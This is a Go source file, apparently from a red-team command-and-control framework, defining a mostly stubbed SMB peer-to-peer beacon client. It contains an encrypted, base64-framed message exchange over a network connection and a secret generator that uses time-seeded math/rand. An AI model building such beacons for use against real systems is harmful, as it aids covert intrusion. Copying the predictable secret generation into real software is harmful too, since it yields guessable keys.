//go:build !windows && linux
// +build !windows,linux

package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"time"
)

// https://posts.specterops.io/designing-peer-to-peer-command-and-control-ad2c61740456

func (server BeaconSmbServer) start()                {}
func (client BeaconSmbClient) queryServer()          {} // unused
func (client BeaconSmbClient) upload(string)         {}
func (client BeaconSmbClient) download(string)       {}
func (client BeaconSmbClient) addProxyClient(Beacon) {}
func (client BeaconSmbClient) exitHandler()          {}

func (client BeaconSmbClient) sendMessage(conn net.Conn, msg string) (string, error) {
	msgEnc := securityContext.encrypt([]byte(msg))
	msgEncoded := b64.StdEncoding.EncodeToString(msgEnc)

	if _, err := fmt.Fprintln(conn, msgEncoded); err != nil {
		return "", err
	}

	r := bufio.NewReader(conn)
	output, err := r.ReadString('\n')

	if err != nil {
		return "", err
	}

	outEnc, err := b64.StdEncoding.DecodeString(output)

	if err != nil {
		return "", err
	}

	fmt.Println("Sending enc message: ")
	fmt.Println(outEnc)
	outDec := securityContext.decrypt(outEnc)
	return outDec, nil
}

func (client BeaconSmbClient) tryHandshake() error {
	return nil
}

func (client BeaconSmbClient) command(command []byte) {}

func genSecret() string {
	rand.Seed(time.Now().UTC().UnixNano())
	b := make([]byte, 16)
	secretBytes := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

	for i := range b {
		b[i] = secretBytes[rand.Intn(len(secretBytes))]
	}

	return string(b)
}
